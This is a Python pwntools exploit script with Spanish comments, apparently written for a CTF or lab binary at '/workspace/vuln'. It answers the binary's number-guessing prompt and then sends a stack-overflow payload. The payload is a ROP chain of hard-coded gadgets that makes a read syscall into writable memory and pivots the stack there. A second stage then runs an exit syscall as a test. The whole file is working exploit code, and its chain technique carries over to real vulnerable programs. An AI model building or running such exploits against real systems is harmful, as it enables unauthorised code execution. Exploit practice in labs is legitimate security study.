#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

# Gadgets
pop_rdi = 0x4006a6
pop_rsi = 0x410b93
pop_rdx = 0x410602
pop_rax = 0x4005af
pop_rbx = 0x400ee8
pop_rdx_rsi = 0x44c9a9
pop_rsp_gadget = 0x45858b
syscall = 0x40138c
writable_addr = 0x6bc3a0

# Probar localmente
io = process('/workspace/vuln')

io.recvuntil(b'What number would you like to guess?\n')
io.sendline(b'84')

io.recvuntil(b'Name? ')

# Etapa 1
payload = b'A' * 112
payload += b'B' * 8

payload += p64(pop_rax) + p64(0)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rdx_rsi) + p64(400) + p64(writable_addr + 0x200)
payload += p64(syscall)

payload += p64(pop_rbx) + p64(writable_addr)
payload += p64(pop_rsp_gadget) + p64(writable_addr + 0x200)

print(f"Payload length: {len(payload)}")

io.sendline(payload)

# Etapa 2
sleep(0.3)
stage2 = b''
stage2 += p64(pop_rax) + p64(60)  # exit(0) simple para probar
stage2 += p64(pop_rdi) + p64(42)
stage2 += p64(syscall)

io.sendline(stage2)

# Ver qué pasa
try:
    io.wait()
    print(f"Exit code: {io.poll()}")
except Exception as e:
    print(f"Exception: {e}")

io.close()
